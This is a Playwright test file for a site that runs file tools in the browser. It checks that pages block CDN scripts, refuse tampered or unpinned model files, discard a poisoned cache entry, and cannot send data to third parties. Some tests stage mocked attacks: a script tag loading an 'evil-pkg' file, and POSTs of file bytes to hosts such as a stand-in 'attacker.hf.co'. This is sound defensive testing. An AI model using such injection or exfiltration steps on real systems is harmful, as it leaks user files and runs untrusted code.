// Third-party code and data are limited to exact, hash-checked files, and only on the pages that need them.
import { test, expect, type Page } from "./fixture";
import { readFileSync } from "node:fs";

const pins = JSON.parse(readFileSync("src/engine/pins.json", "utf8"));

// A service worker can carry requests past the mocks below, which would download the real models.
test.use({ serviceWorkers: "block" });

const blocked = (page: Page, url: string) => page.evaluate((u) => fetch(u, { method: "POST", body: "FILEBYTES" }).then(() => false, () => true), url);
const go = (page: Page) => page.locator("#panel > .btn").first();

test("no page can load script from a CDN", async ({ page }) => {
  await page.route("https://cdn.jsdelivr.net/**", (r) => r.fulfill({ contentType: "text/javascript", body: "window.__pwned = true" }));
  for (const path of ["/compress-pdf", "/remove-background"]) {
    await page.goto(path);
    await page.evaluate(() => new Promise((res) => { const s = document.createElement("script"); s.src = "https://cdn.jsdelivr.net/npm/evil-pkg@1/x.js"; s.onload = s.onerror = res; document.head.append(s); }));
    expect(await page.evaluate(() => (window as any).__pwned ?? false)).toBe(false);
  }
});
test("tools without a model cannot reach any third party", async ({ page }) => {
  await page.route(/huggingface|hf\.co|jsdelivr/, (r) => r.fulfill({ status: 200, body: "ok" }));
  for (const path of ["/redact-pdf", "/compress-image", "/ocr-image", "/blur-faces"]) {
    await page.goto(path);
    for (const url of ["https://huggingface.co/x", "https://cdn.jsdelivr.net/x", "https://attacker.hf.co/x"]) expect(await blocked(page, url), `${path} ${url}`).toBe(true);
  }
});
test("OCR language data is served by this site", async ({ page }) => {
  const res = await page.request.get("/vendor/tessdata/eng.traineddata.gz");
  expect(res.status()).toBe(200);
  const { createHash } = await import("node:crypto");
  expect(createHash("sha256").update(await res.body()).digest("hex")).toBe(pins.tessdata.eng);
});

const REAL_WASM = "node_modules/onnxruntime-web/dist/ort-wasm-simd-threaded.asyncify.wasm";
async function startModel(page: Page, onRequest: (url: string) => void, realRuntime = true) {
  await page.route(/huggingface\.co|hf\.co|cdn\.jsdelivr\.net/, (r) => {
    const url = r.request().url(); onRequest(url);
    const headers = { "access-control-allow-origin": "*" };
    return realRuntime && url.endsWith(".wasm") ? r.fulfill({ status: 200, headers, contentType: "application/wasm", path: REAL_WASM }) : r.fulfill({ status: 200, headers, body: "tampered" });
  });
  await page.goto("/remove-background");
  await page.locator("#stage input[type=file]").first().setInputFiles("tests/fixtures/small.png");
  await expect(go(page)).toBeEnabled({ timeout: 20_000 });
  await go(page).click();
  await expect(page.locator("#panel .alert")).toBeVisible({ timeout: 45_000 });
}
test("a changed runtime file is refused", async ({ page }) => {
  await startModel(page, () => {}, false);
  await expect(page.locator("#panel .alert")).toContainText(/verified/i);
  await expect(page.locator("#panel .results a[download]")).toHaveCount(0);
});
test("the model loader never asks for a moving branch", async ({ page }) => {
  const urls: string[] = [];
  await startModel(page, (u) => urls.push(u));
  expect(urls.some((u) => u.includes("huggingface.co"))).toBe(true);
  expect(urls.filter((u) => u.includes("/resolve/main/"))).toEqual([]);
  await expect(page.locator("#panel .alert")).toContainText(/integrity/i);
});
test("a poisoned cached model is thrown away", async ({ page }) => {
  await page.goto("/privacy");
  const key = `https://huggingface.co/Xenova/modnet/resolve/${pins.revisions["Xenova/modnet"]}/config.json`;
  await page.evaluate(async (k) => { const c = await caches.open("lathe-models"); await c.put(k, new Response("{\"poisoned\":true}")); }, key);
  await startModel(page, () => {});
  expect(await page.evaluate(async (k) => !!(await (await caches.open("lathe-models")).match(k)), key)).toBe(false);
});
test("an interrupted model download explains what to do", async ({ page }) => {
  await page.route(/huggingface\.co|hf\.co|cdn\.jsdelivr\.net/, (r) => r.request().url().endsWith(".wasm") ? r.fulfill({ status: 200, headers: { "access-control-allow-origin": "*" }, contentType: "application/wasm", path: REAL_WASM }) : r.abort("connectionreset"));
  await page.goto("/remove-background");
  await page.locator("#stage input[type=file]").first().setInputFiles("tests/fixtures/small.png");
  await expect(go(page)).toBeEnabled({ timeout: 20_000 }); await go(page).click();
  await expect(page.locator("#panel .alert")).toContainText(/interrupted.*connection/i, { timeout: 45_000 });
  await expect(go(page)).toHaveText("Download model and run");
});
